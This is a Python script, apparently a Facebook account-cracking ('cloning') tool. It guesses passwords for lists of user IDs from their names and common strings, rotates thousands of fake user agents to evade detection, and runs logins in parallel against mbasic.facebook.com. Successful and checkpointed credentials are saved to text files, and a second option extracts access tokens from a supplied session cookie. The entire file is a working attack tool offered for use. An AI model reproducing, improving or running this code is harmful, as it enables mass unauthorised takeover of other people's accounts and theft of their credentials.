#CODING BY UTF-8
#AlpinCompiler
#Owner: CHARSI

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col

import os, sys, time, re, json, requests, bs4, random, calendar, datetime, subprocess, logging
from concurrent.futures import ThreadPoolExecutor as khamdihiXD

from datetime import datetime
from bs4 import BeautifulSoup as parser
ct = datetime.now()
n = ct.month
bulan_ = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
bulan12 = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

# Colors
P = '\x1b[1;97m' # WHITE
M = '\x1b[1;91m' # RED
H = '\x1b[1;92m' # GREEN
K = '\x1b[1;93m' # YELLOW
B = '\x1b[1;94m' # BLUE
U = '\x1b[1;95m' # PURPLE
O = '\x1b[1;96m' # LIGHT BLUE
N = '\x1b[0m'    # NORMAL
J = '\033[38;2;255;127;0;1m' # ORANGE

user, mi, status_foll, cr, ok, cp, id, loop, looping = [], [], [], [], [], [], [], 0, 1
ta = current.year
bu = current.month
ha = current.day
op = bulan_[nTemp]
waktu = '%s-%s-%s'%(ha,op,ta)

# --- USER AGENTS GENERATOR ---
ugen = []
for x in range(2000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12','13','14'])
    c='K'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,125)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uagent=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uagent)

def jalan(kontol):
	for wibu in kontol + "\n":
		sys.stdout.write(wibu)
		sys.stdout.flush()
		time.sleep(0.03)

def banner():
	os.system('clear')
	print(f'''{H}
  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—
 â–ˆâ–ˆâ•”â• â• â• â• â• â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â• â• â• â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
 â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â• â–ˆâ–ˆâ•—â•šâ• â• â• â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘
 â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
  â•šâ• â• â• â• â• â• â•šâ• â•   â•šâ• â• â•šâ• â•   â•šâ• â• â•šâ• â•   â•šâ• â• â•šâ• â•   â•šâ• â• â•šâ• â• â• â• â• â• â• â•šâ• â• 
                                           
\t   {O}[ OWNER : CHARSI ]{N}
''')

class menu:
	def main(self):
		banner()
		print(f" {H}[01] File Cloning (File Crack)")
		print(f" {H}[02] Public Cloning (Cookie Required)")
		print(f" {H}[03] Check Crack Results")
		print(f" {H}[00] Exit")
		print(f" {P}--------------------------------------------------")
		opt = input(f" {P}[?] Choose Option: ")
		if opt in ['1','01']:
			self.file_crack()
		elif opt in ['2','02']:
			self.login_cookie()
		elif opt in ['3','03']:
			self.results()
		else:
			exit()

	def login_cookie(self):
		banner()
		cookie=input("%s[+] ENTER COOKIE : %s"%(H,K))
		try:
			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": random.choice(ugen),"referer": "https://www.facebook.com/"}, cookies = {"cookie":cookie}) 
			find_token = re.search("(EAAG\w+)", data.text)
			open("token.x", "w").write(find_token.group(1))
			open("cookies.x", "w").write(cookie)
			print('\n\033[92;1m LOGIN SUCCESSFUL'); time.sleep(2); self.main()
		except:
			print('%s# INVALID OR EXPIRED COOKIE'%(M)); time.sleep(2); self.main()

	def file_crack(self):
		banner()
		print(f" {H}[+] Enter File Path (e.g: /sdcard/ids.txt)")
		path = input(f" {P}[?] File Path: ")
		try:
			ids = open(path, 'r').read().splitlines()
		except FileNotFoundError:
			print(f" {M}[!] File Not Found!"); time.sleep(2); self.main()
		
		print(f" {H}[+] Total IDs Found: {len(ids)}")
		print(f" {P}--------------------------------------------------")
		
		with khamdihiXD(max_workers=30) as charsi_pool:
			for line in ids:
				try:
					uid, name = line.split('|')
				except:
					uid = line; name = "Facebook User"
				
				pwx = [name, name+'123', name+'1234', name+'12345', '786786', 'pakistan', 'khan123']
				charsi_pool.submit(self.cloning_engine, uid, pwx, len(ids))
		
		print(f"\n {P}--------------------------------------------------")
		print(f" {H}[+] Process Finished. OK: {len(ok)} CP: {len(cp)}")
		exit()

	def cloning_engine(self, user, pwx, total):
		global loop, ok, cp
		sys.stdout.write(f'\r {P}[CHARSI] {loop}/{total} OK:{H}{len(ok)} {P}CP:{K}{len(cp)} '); sys.stdout.flush()
		for pw in pwx:
			try:
				ua = random.choice(ugen)
				ses = requests.Session()
				free_fb = ses.get(f'https://mbasic.facebook.com').text
				log_data = {
					"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
					"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
					"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
					"email":user,
					"pass":pw,
					"login":"Log In"}
				header = {'authority': 'mbasic.facebook.com', 'user-agent': ua}
				res = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/', data=log_data, headers=header)
				if 'c_user' in ses.cookies.get_dict():
					print(f'\r {H}â•šâ• â• â• â—¨ [CHARSI-OK] {user} | {pw}{N}')
					ok.append(user)
					open('Ok.txt', 'a').write(f'{user}|{pw}\n')
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					print(f'\r {K}â•šâ• â• â• â—§ [CHARSI-CP] {user} | {pw}{N}')
					cp.append(user)
					open('Cp.txt', 'a').write(f'{user}|{pw}\n')
					break
			except requests.exceptions.ConnectionError:
				time.sleep(10)
		loop += 1

	def results(self):
		print(f" {H}[1] Check OK Results")
		print(f" {K}[2] Check CP Results")
		res = input(f" {P}[?] Choice: ")
		if res == '1':
			try: print(open('Ok.txt','r').read())
			except: print("No OK results found.")
		elif res == '2':
			try: print(open('Cp.txt','r').read())
			except: print("No CP results found.")
		input("Press Enter to return..."); self.main()

if __name__ == '__main__':
	menu().main()
